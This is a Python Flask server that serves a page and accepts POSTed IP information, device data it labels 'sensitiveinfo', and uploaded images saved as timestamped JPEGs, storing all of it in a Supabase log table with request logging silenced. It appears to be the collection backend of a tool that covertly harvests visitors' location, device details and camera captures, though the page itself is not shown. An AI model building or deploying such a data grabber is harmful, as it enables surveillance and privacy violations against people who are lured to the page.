from supabase import create_client
from colorama import Fore, Back, Style
from flask import Flask, request, jsonify, Response
from datetime import datetime
import time
import os
import logging
from flask_cors import CORS

# Create image folder if not exists
if not os.path.exists('image'):
    os.mkdir('image')

PATH_TO_IMAGES_DIR = 'image'

app = Flask(__name__)
CORS(app)  # Add CORS support

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def index():
    return Response(open('index.html').read(), mimetype="text/html")

def save_to_db(payload):
    try:
        supabase.table("logs").insert({
            "data": payload,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        print(f"Saved to DB: {payload['type']}")
    except Exception as e:
        print(f"DB Save Error: {e}")

@app.route('/api/ipinfo', methods=['POST'])
def ipinfo():
    try:
        iplogs = request.json
        save_to_db({"type": "ipinfo", "data": iplogs})
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/device-info', methods=['POST'])
def device_info():
    try:
        logs = request.json
        save_to_db({"type": "sensitiveinfo", "data": logs})
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/upload-image', methods=['POST'])
def upload_image():
    try:
        image = request.files.get('image')
        if not image:
            return jsonify({"error": "No image provided"}), 400
        
        filename = f"{datetime.now().strftime('%Y%m%d-%H%M%S')}.jpeg"
        image.save(f"image/{filename}")
        save_to_db({"type": "image", "filename": filename})
        
        return jsonify({"status": "success", "filename": filename}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0', port=8080)